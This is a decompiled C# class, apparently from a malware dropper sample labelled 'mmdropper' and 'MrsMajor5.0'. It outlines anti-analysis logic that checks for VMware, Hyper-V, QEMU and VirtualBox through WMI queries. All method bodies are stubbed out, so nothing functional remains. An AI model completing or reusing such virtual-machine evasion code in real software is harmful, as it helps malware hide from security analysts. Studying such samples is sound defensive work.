// Decompiled with JetBrains decompiler
// Type: VirtualMachineDetector
// Assembly: mmdropper, Version=1.0.7321.42228, Culture=neutral, PublicKeyToken=null
// MVID: 67C14436-991D-42DC-A31E-001F369439CC
// Assembly location: C:\Users\victim\Documents\GitHub\MrsMajor5.0\decompiled\eulascr_Slayed.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;

public class VirtualMachineDetector
{
  private static IVirtualEnvironment[] _detectors = new IVirtualEnvironment[4]
  {
    (IVirtualEnvironment) new VmWarePlayer(),
    (IVirtualEnvironment) new HyperVMachine(),
    (IVirtualEnvironment) new QEmuMachine(),
    (IVirtualEnvironment) new VirtualBoxMachine()
  };
  private static ComputerSystem _computer = VirtualMachineDetector.Create<ComputerSystem>("Win32_ComputerSystem");
  private static BIOS _bios = VirtualMachineDetector.Create<BIOS>("Win32_BIOS");
  private static MotherboardDevice _motherboard = VirtualMachineDetector.Create<MotherboardDevice>("Win32_MotherboardDevice");
  private static IEnumerable<DiskDrive> _disks;
  private static IEnumerable<PnPEntity> _devices = (IEnumerable<PnPEntity>) VirtualMachineDetector.CreateList<PnPEntity>("Win32_PnPEntity");
  private static IEnumerable<WindowsService> _services;

  static VirtualMachineDetector()
  {
    VirtualMachineDetector._disks = (IEnumerable<DiskDrive>) VirtualMachineDetector.CreateList<DiskDrive>("Win32_DiskDrive");
    VirtualMachineDetector._services = VirtualMachineDetector.GetWindowsServices();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
    public static bool Assert(out string name)
    {
        name = string.Empty; // Assign a default value to the out parameter.
        return false; // Return the result.
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
  public static bool Assert() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static IEnumerable<WindowsService> GetWindowsServices()
  {
    return (IEnumerable<WindowsService>) null;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static T Create<T>(string key) => default (T);

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static List<T> CreateList<T>(string key) => (List<T>) null;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public VirtualMachineDetector()
  {
  }
}
